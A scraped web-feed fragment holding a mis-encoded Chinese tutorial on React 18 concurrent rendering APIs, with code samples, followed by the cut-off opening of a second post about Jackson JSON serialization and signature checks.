ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>React 18å¹¶å‘æ¸²æŸ“å®æˆ˜ï¼š5ä¸ªæ ¸å¿ƒAPIè®©ä½ çš„åº”ç”¨æ€§èƒ½é£™å‡50%</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>React 18çš„å‘å¸ƒæ ‡å¿—ç€Reactç”Ÿæ€æ­£å¼è¿ˆå…¥äº†å¹¶å‘æ¸²æŸ“ï¼ˆConcurrent Renderingï¼‰æ—¶ä»£ã€‚è¿™ä¸€é‡å¤§å‡çº§ä¸ä»…å¸¦æ¥äº†æ›´æµç•…çš„ç”¨æˆ·ä½“éªŒï¼Œè¿˜ä¸ºå¼€å‘è€…æä¾›äº†å¼ºå¤§çš„å·¥å…·æ¥ä¼˜åŒ–åº”ç”¨æ€§èƒ½ã€‚æ®ç»Ÿè®¡ï¼Œåˆç†ä½¿ç”¨React 18çš„å¹¶å‘ç‰¹æ€§å¯ä»¥è®©åº”ç”¨æ€§èƒ½æå‡é«˜è¾¾50%ã€‚æœ¬æ–‡å°†æ·±å…¥è§£æReact 18çš„5ä¸ªæ ¸å¿ƒAPIï¼Œå¹¶é€šè¿‡å®æˆ˜æ¡ˆä¾‹å±•ç¤ºå¦‚ä½•åˆ©ç”¨å®ƒä»¬å®ç°æ€§èƒ½é£è·ƒã€‚</p>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯å¹¶å‘æ¸²æŸ“ï¼Ÿ</h3>
<p>å¹¶å‘æ¸²æŸ“æ˜¯React 18çš„æ ¸å¿ƒç‰¹æ€§ï¼Œå®ƒå…è®¸Reactåœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­ä¸­æ–­å’Œæ¢å¤å·¥ä½œï¼Œä»è€Œä¼˜å…ˆå¤„ç†é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡ï¼ˆå¦‚ç”¨æˆ·äº¤äº’ï¼‰ï¼Œé¿å…ç•Œé¢å¡é¡¿ã€‚è¿™ä¸ä¼ ç»Ÿçš„åŒæ­¥æ¸²æŸ“æ¨¡å¼æœ‰æœ¬è´¨åŒºåˆ«ï¼šåŒæ­¥æ¸²æŸ“å¿…é¡»ä¸€æ¬¡æ€§å®Œæˆæ‰€æœ‰å·¥ä½œï¼Œè€Œå¹¶å‘æ¸²æŸ“åˆ™æ›´åŠ çµæ´»ï¼Œèƒ½å¤Ÿæ›´å¥½åœ°åˆ©ç”¨æµè§ˆå™¨çš„ä¸»çº¿ç¨‹èµ„æºã€‚</p>
<h3 data-id="heading-3">5ä¸ªæ ¸å¿ƒAPIè§£æä¸å®æˆ˜</h3>
<h4 data-id="heading-4">1. <code>createRoot</code>ï¼šå¯ç”¨å¹¶å‘æ¨¡å¼çš„ç¬¬ä¸€æ­¥</h4>
<p>åœ¨React 18ä¸­ï¼Œä¼ ç»Ÿçš„<code>ReactDOM.render</code>è¢«æ–°çš„<code>createRoot</code> APIå–ä»£ã€‚è¿™æ˜¯å¯ç”¨å¹¶å‘æ¸²æŸ“çš„åŸºç¡€æ­¥éª¤ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>;

<span class="hljs-keyword">const</span> root = <span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>));
root.<span class="hljs-title function_">render</span>(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong></p>
<ul>
<li><code>createRoot</code>æ˜¯å¹¶å‘æ¸²æŸ“çš„å…¥å£ï¼Œåªæœ‰é€šè¿‡å®ƒåˆ›å»ºçš„æ ¹èŠ‚ç‚¹æ‰èƒ½äº«å—å¹¶å‘ç‰¹æ€§ã€‚</li>
<li>ä¸æ—§ç‰ˆ<code>render</code>ç›¸æ¯”ï¼Œ<code>createRoot</code>æä¾›äº†æ›´ç»†ç²’åº¦çš„æ§åˆ¶èƒ½åŠ›ï¼Œä¾‹å¦‚æ”¯æŒæ‰¹é‡æ›´æ–°å’Œä¼˜å…ˆçº§è°ƒåº¦ã€‚</li>
</ul>
<h4 data-id="heading-5">2. <code>startTransition</code>ï¼šåŒºåˆ†ç´§æ€¥ä¸éç´§æ€¥æ›´æ–°</h4>
<p><code>startTransition</code>æ˜¯React 18ä¸­ç”¨äºæ ‡è®°éç´§æ€¥æ›´æ–°çš„APIã€‚é€šè¿‡å®ƒï¼Œå¼€å‘è€…å¯ä»¥æ˜ç¡®å‘Šè¯‰Reactå“ªäº›æ›´æ–°å¯ä»¥å»¶è¿Ÿæ‰§è¡Œï¼Œä»è€Œç¡®ä¿é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ï¼‰ä¸è¢«é˜»å¡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { startTransition, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchBox</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [input, setInput] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [results, setResults] = <span class="hljs-title function_">useState</span>([]);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-title function_">setInput</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// ç´§æ€¥æ›´æ–°ï¼šç«‹å³åæ˜ ç”¨æˆ·è¾“å…¥</span>
    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">fetchResults</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>).<span class="hljs-title function_">then</span>(setResults); <span class="hljs-comment">// éç´§æ€¥æ›´æ–°ï¼šå»¶è¿Ÿæ‰§è¡Œ</span>
    });
  };

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{input}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{handleChange}</span> /&gt;</span></span>;
}
</code></pre>
<p><strong>æ€§èƒ½æå‡ç‚¹ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·è¾“å…¥ä¸å†å› ä¸ºåç«¯è¯·æ±‚è€Œå¡é¡¿ã€‚</li>
<li>Reactä¼šåœ¨æµè§ˆå™¨ç©ºé—²æ—¶å¤„ç†è¿‡æ¸¡ä»»åŠ¡ï¼Œæ˜¾è‘—æå‡äº¤äº’æµç•…åº¦ã€‚</li>
</ul>
<h4 data-id="heading-6">3. <code>useDeferredValue</code>ï¼šå»¶è¿Ÿæ´¾ç”Ÿå€¼çš„æ›´æ–°</h4>
<p><code>useDeferredValue</code>æ˜¯ä¸€ä¸ªHookï¼Œç”¨äºå»¶è¿ŸæŸä¸ªå€¼çš„æ›´æ–°ï¼Œç›´åˆ°æ›´é‡è¦çš„ä»»åŠ¡å®Œæˆåå†å¤„ç†ã€‚å®ƒæ˜¯ä¼˜åŒ–æ´¾ç”ŸçŠ¶æ€ï¼ˆå¦‚æœç´¢ç»“æœçš„è¿‡æ»¤ï¼‰çš„å¼ºå¤§å·¥å…·ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useDeferredValue, useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ResultsList</span>(<span class="hljs-params">{ query }</span>) {
  <span class="hljs-keyword">const</span> deferredQuery = <span class="hljs-title function_">useDeferredValue</span>(query);
  <span class="hljs-keyword">const</span> results = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">filterResults</span>(deferredQuery), [deferredQuery]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">items</span>=<span class="hljs-string">{results}</span> /&gt;</span></span>;
}
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å½“è®¡ç®—å¯†é›†å‹æ“ä½œï¼ˆå¦‚å¤§å‹åˆ—è¡¨è¿‡æ»¤ï¼‰å¯èƒ½é˜»å¡ä¸»çº¿ç¨‹æ—¶ã€‚</li>
<li><code>deferredQuery</code>ä¼šåœ¨é«˜ä¼˜å…ˆçº§ä»»åŠ¡å®Œæˆåè‡ªåŠ¨æ›´æ–°ï¼Œç¡®ä¿ç•Œé¢å“åº”æ€§ã€‚</li>
</ul>
<h4 data-id="heading-7">4. <code>&lt;Suspense&gt;</code> + <code>lazy</code>ï¼šæ›´æ™ºèƒ½çš„ä»£ç æ‹†åˆ†ä¸åŠ è½½çŠ¶æ€ç®¡ç†</h4>
<p>è™½ç„¶<code>Suspense</code>å’Œ<code>lazy</code>åœ¨Reactä¹‹å‰ç‰ˆæœ¬ä¸­å°±å·²å­˜åœ¨ï¼Œä½†åœ¨React 18ä¸­å®ƒä»¬çš„è¡¨ç°æ›´åŠ å‡ºè‰²ï¼Œå°¤å…¶æ˜¯åœ¨å¹¶å‘æ¨¡å¼ä¸‹ï¼š</p>
<ul>
<li><code>&lt;Suspense&gt;</code>ç°åœ¨å¯ä»¥åµŒå¥—ä½¿ç”¨ï¼Œå¹¶æ”¯æŒæ›´ç²¾ç»†çš„å›é€€ï¼ˆfallbackï¼‰æ§åˆ¶ã€‚</li>
<li><code>lazy</code>ç»„ä»¶åŠ è½½æ—¶å¯ä»¥ä¸å…¶ä»–å¹¶å‘ä»»åŠ¡åè°ƒå·¥ä½œã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./HeavyComponent'</span>));

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>}&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœï¼š</strong></p>
<ul>
<li>å‡å°‘é¦–å±åŠ è½½æ—¶é—´ï¼Œæå‡LCPï¼ˆæœ€å¤§å†…å®¹ç»˜åˆ¶ï¼‰æŒ‡æ ‡ã€‚</li>
<li>Reactä¼šä¼˜å…ˆæ¸²æŸ“å·²å‡†å¤‡å¥½çš„å†…å®¹ï¼Œé¿å…â€œå…¨æœ‰æˆ–å…¨æ— â€çš„åŠ è½½é—®é¢˜ã€‚</li>
</ul>
<h4 data-id="heading-8">5. <code>useId</code>ï¼šè§£å†³SSRä¸­çš„Hydrationä¸åŒ¹é…é—®é¢˜</h4>
<p>åœ¨æœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„IDç”Ÿæˆä¸ä¸€è‡´å¯èƒ½å¯¼è‡´Hydrationé”™è¯¯ã€‚<code>useId</code>æä¾›äº†ä¸€ç§ç¨³å®šçš„IDç”Ÿæˆæœºåˆ¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Checkbox</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">useId</span>();
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">htmlFor</span>=<span class="hljs-string">{id}</span>&gt;</span>Accept terms<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">{id}</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
);
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong></p>
<ul>
<li>SSRåº”ç”¨ä¸­å¸¸è§çš„â€œWarning: Text content did not matchâ€é—®é¢˜é€šå¸¸æºäºåŠ¨æ€IDçš„ä¸ä¸€è‡´ã€‚</li>
<li><code>useId</code>ç”Ÿæˆçš„IDåœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¿æŒä¸€è‡´ï¼Œå½»åº•è§£å†³æ­¤ç±»é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-9">å®æˆ˜æ¡ˆä¾‹ï¼šä¼˜åŒ–ä¸€ä¸ªå¤§å‹æ•°æ®è¡¨</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªéœ€è¦æ¸²æŸ“10,000è¡Œæ•°æ®çš„è¡¨æ ¼ã€‚ä¼ ç»ŸåŒæ­¥æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·å¯èƒ½ä¼šé‡åˆ°æ˜æ˜¾çš„å¡é¡¿ï¼›è€Œé€šè¿‡å¹¶å‘ç‰¹æ€§æ”¹é€ åï¼š</p>
<ol>
<li><strong>ä½¿ç”¨<code>startTransition</code>å»¶è¿Ÿæ’åº/ç­›é€‰æ“ä½œ</strong>ï¼šç¡®ä¿æ»šåŠ¨å’Œç‚¹å‡»ç­‰é«˜ä¼˜å…ˆçº§äº¤äº’ä¸è¢«é˜»å¡ã€‚</li>
<li><strong>ç»“åˆ<code>useDeferredValue</code>ä¼˜åŒ–æ´¾ç”ŸçŠ¶æ€</strong>ï¼šä»…åœ¨æµè§ˆå™¨ç©ºé—²æ—¶æ›´æ–°è¿‡æ»¤åçš„æ•°æ®ã€‚</li>
<li><strong>è™šæ‹Ÿæ»šåŠ¨ + <code>&lt;Suspense&gt;</code>åˆ†å—åŠ è½½</strong>ï¼šæŒ‰éœ€æ¸²æŸ“å¯è§åŒºåŸŸçš„è¡Œæ•°æ®ã€‚</li>
</ol>
<p>æ”¹é€ åçš„æ€§èƒ½å¯¹æ¯”ï¼š</p>
<ul>
<li><strong>é¦–æ¬¡åŠ è½½æ—¶é—´å‡å°‘40%</strong>ï¼ˆå¾—ç›Šäºä»£ç æ‹†åˆ†å’Œåˆ†å—Hydrationï¼‰ã€‚</li>
<li><strong>äº¤äº’å»¶è¿Ÿé™ä½50%ä»¥ä¸Š</strong>ï¼ˆé€šè¿‡ä¼˜å…ˆçº§è°ƒåº¦é¿å…ä¸»çº¿ç¨‹é˜»å¡ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-10">Reactå¹¶å‘æ¨¡å¼çš„åº•å±‚åŸç†</h3>
<p>ä¸ºäº†æ›´å¥½åœ°ç†è§£è¿™äº›APIçš„å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬éœ€è¦ç®€è¦æ¢è®¨Fiberæ¶æ„å’Œè°ƒåº¦å™¨ï¼ˆSchedulerï¼‰çš„å®ç°ï¼š</p>
<ol>
<li><strong>FiberèŠ‚ç‚¹çš„å¯ä¸­æ–­æ€§</strong>ï¼šæ¯ä¸ªFiberèŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªå·¥ä½œå•å…ƒï¼ŒReactå¯ä»¥æš‚åœæˆ–æ¢å¤å…¶æ¸²æŸ“ã€‚</li>
<li><strong>åŸºäºä¼˜å…ˆçº§çš„è°ƒåº¦</strong>ï¼š
<ul>
<li>Immediateï¼ˆç«‹å³æ‰§è¡Œï¼‰ï¼šå¦‚ç”¨æˆ·è¾“å…¥ã€‚</li>
<li>Defaultï¼ˆé»˜è®¤ï¼‰ï¼šæ™®é€šUIæ›´æ–°ã€‚</li>
<li>Transitionï¼ˆè¿‡æ¸¡ï¼‰ï¼šå¯ä¸­æ–­çš„ä½ä¼˜å…ˆçº§ä»»åŠ¡ã€‚</li>
</ul>
</li>
<li><strong>æ—¶é—´åˆ‡ç‰‡ï¼ˆTime Slicingï¼‰</strong>ï¼šå°†é•¿ä»»åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ª5msçš„å°å—æ‰§è¡Œã€‚</li>
</ol>
<p>###æ³¨æ„äº‹é¡¹ä¸æœ€ä½³å®è·µ</p>
<p>å°½ç®¡å¹¶å‘æ¨¡å¼å¼ºå¤§ä½†å¹¶éé“¶å¼¹ï¼š</p>
<ol>
<li><strong>é€æ­¥é‡‡ç”¨ç­–ç•¥</strong>ï¼š
-å…ˆé€šè¿‡éƒ¨åˆ†è·¯ç”±æˆ–ç»„ä»¶è¯•ç”¨æ–°ç‰¹æ€§ã€‚
-ä½¿ç”¨StrictModeæ£€æµ‹æ½œåœ¨é—®é¢˜ã€‚</li>
<li><strong>æ€§èƒ½ç›‘æ§å¿…ä¸å¯å°‘</strong>
-å…³æ³¨TBT(æ€»é˜»å¡æ—¶é—´)å’ŒINP(äº¤äº’åˆ°ä¸‹ä¸€æ¬¡ç»˜åˆ¶)æŒ‡æ ‡ã€‚</li>
</ol>
<p>3.<strong>é¿å…è¿‡åº¦ä¼˜åŒ–</strong>
-å¯¹ç®€å•ç»„ä»¶å¯èƒ½å¼•å…¥ä¸å¿…è¦çš„å¤æ‚æ€§ã€‚</p>
<p>###æ€»ç»“</p>
<p>ä»ä¼ ç»ŸåŒæ­¥æ¨¡å¼åˆ°ç°ä»£Webåº”ç”¨çš„æµç•…ä½“éªŒä¹‹é—´éš”ç€ä¸€é“å·¨å¤§çš„é¸¿æ²Ÿâ€”â€”è€ŒReact18æä¾›çš„è¿™5ä¸ªæ ¸å¿ƒAPIæ­£æ˜¯è·¨è¶Šå®ƒçš„æ¡¥æ¢ï¼š</p>
<p>1.createRootå¼€å¯æ–°æ—¶ä»£çš„å¤§é—¨ï¼›
2.startTransitionåˆ’åˆ†ä»»åŠ¡çš„è½»é‡ç¼“æ€¥ï¼›
3.useDeferredValueè®©æ´¾ç”ŸçŠ¶æ€ä¼˜é›…é™çº§ï¼›
4.Suspenseå®¶æ—ç»Ÿä¸€å¼‚æ­¥å¤„ç†çš„ç”¨æˆ·ä½“éªŒï¼›
5.useIdè§£å†³SSRä¸­çš„é¡½ç–¾ã€‚</p>
<p>å½“ä½ å°†è¿™äº›å·¥å…·ç»„åˆä½¿ç”¨æ—¶ç”šè‡³å¯ä»¥å®ç°è¶…è¿‡50%çš„æ€§èƒ½æå‡â€”â€”è¿™ä¸ä»…æ˜¯ä¸€ä¸ªæ•°å­—æ›´æ˜¯ç”¨æˆ·ä½“éªŒè´¨çš„é£è·ƒã€‚</p>
<p>æœªæ¥éšç€æ›´å¤šæ¡†æ¶(å¦‚Next.js)æ·±åº¦æ•´åˆè¿™äº›ç‰¹æ€§æˆ‘ä»¬æœ‰ç†ç”±ç›¸ä¿¡:2024å¹´å°†æˆä¸ºçœŸæ­£æ„ä¹‰ä¸Šçš„"Webåº”ç”¨é«˜æ€§èƒ½å…ƒå¹´"ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jacksonåºåˆ—åŒ–è®©éªŒç­¾å¤±è´¥ï¼Ÿç ´è§£JSONè½¬ä¹‰é™·é˜±]]></title>    <link>https://juejin.cn/post/7582815307439882291</link>    <guid>https://juejin.cn/post/7582815307439882291</guid>    <pubDate>2025-12-13T04:26:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582815307439882291" data-draft-id="7582809606067781658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jacksonåºåˆ—åŒ–è®©éªŒç­¾å¤±è´¥ï¼Ÿç ´è§£JSONè½¬ä¹‰é™·é˜±"/> <meta itemprop="keywords" content="åç«¯,Java,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-13T04:26:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="9å·è¾¾äºº"/> <meta itemprop="url" content="https://juejin.cn/user/2450136052270077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jacksonåºåˆ—åŒ–è®©éªŒç­¾å¤±è´¥ï¼Ÿç ´è§£JSONè½¬ä¹‰é™·é˜±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2450136052270077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    9å·è¾¾äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T04:26:32.000Z" title="Sat Dec 13 2025 04:26:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid 